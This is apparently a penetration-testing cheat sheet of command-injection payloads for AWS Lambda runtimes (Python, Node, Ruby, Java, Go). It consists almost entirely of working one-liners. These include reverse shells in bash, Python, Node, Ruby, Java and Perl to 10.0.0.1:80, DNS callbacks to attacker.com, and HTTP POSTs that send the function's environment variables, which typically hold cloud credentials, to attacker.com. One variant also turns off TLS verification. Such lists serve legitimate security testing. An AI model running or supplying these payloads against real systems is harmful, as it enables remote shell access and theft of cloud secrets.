# Lambda

AWS Lambda functions are ran in a limited container with native libraries. This listing provides payloads that were identified to work in each function's runtime to demonstrate command injection. None of the payloads should rely on additional Lambda layers or 3rd party packages. This should result in generic payloads that can be used in each of the common runtime environments.

If the payload requires pipes or redirectors you may need to borrow the `sh -c $@|sh . echo <command>` technique from [https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html](https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html)

## Generic

Bash Reverse Shell
```
bash -i >& /dev/tcp/10.0.0.1/80 0>&1
```

## Python

### DNS

```
python3 -c 'import socket;socket.gethostbyname("attacker.com")'
```

### OOB HTTP Request

```
python3 -c 'import os,urllib3;h=urllib3.PoolManager();h.request("POST","https://attacker.com/data",fields={"q":str(os.environ)})'
```

### Reverse Shell
[Credit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

```
python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Node

### DNS

```
node -e 'var dns=require("dns");dns.lookup("attacker.com",()=>({}))'
```

### OOB HTTP Request

```
node -e 'fetch("https://attacker.com/data",{method:"POST",body:JSON.stringify(process.env)});'
```

### Reverse Shell

```
node --input-type=module -e 'import "net";import * as cp from "child_process";var sh = cp.spawn("/bin/sh",[]);var client = new net.Socket();client.connect(80,"10.0.0.1",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
```

## Ruby

### DNS

```
ruby -r resolv -e 'Resolv.getaddress "attacker.com"'
```

### OOB HTTP Request

```
ruby -ruri -r 'net/http' -e 'Net::HTTP.post_form(URI("https://attacker.com"),ENV.to_h)'
```

If there is a TLS verification issue, verification can be disabled:

```
ruby -r openssl -r uri -r 'net/http' -e 'OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE; Net::HTTP.post_form(URI("https://attacker.com"),ENV.to_h)'
```

### Reverse Shell
[Credit](https://gist.github.com/xfgusta/cfc8b4283fcfeabbfff3437ef6329916)

```
ruby -rsocket -e'Process.wait spawn("sh",[0,1,2]=>TCPSocket.new("10.0.0.1",80))'
```

## Java

### DNS

```
printf 'InetAddress.getByName("attacker.com")\n/exit\n' | jshell
```

### OOB HTTP Request

```
printf 'java.net.http.HttpClient client = java.net.http.HttpClient.newBuilder().build();java.net.http.HttpRequest request = java.net.http.HttpRequest.newBuilder().POST(java.net.http.HttpRequest.BodyPublishers.ofString(System.getenv().toString())).uri(java.net.URI.create("https://attacker.com")).build();client.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());\n/exit\n' | jshell
```

### Reverse Shell
[Credit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1)

```
printf 'String host="10.0.0.1";int port=80;String cmd="/bin/sh";Process p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n/exit\n' | jshell
```

## GoLang

Python3 and perl interpreters exist in the GoLang Lambda environment, as such payloads can be used from these languages against GoLang containers.

### DNS

```
perl -e 'use Socket;gethostbyname("attacker.com");'
```

### OOB HTTP Request

Curl exists on the GoLang container, but not other containers.

```
/usr/bin/curl -X POST https://attacker.com -d @/proc/self/environ
```

### Reverse Shell
[Credit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl)

```
perl -e 'use Socket;$i="10.0.0.1";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
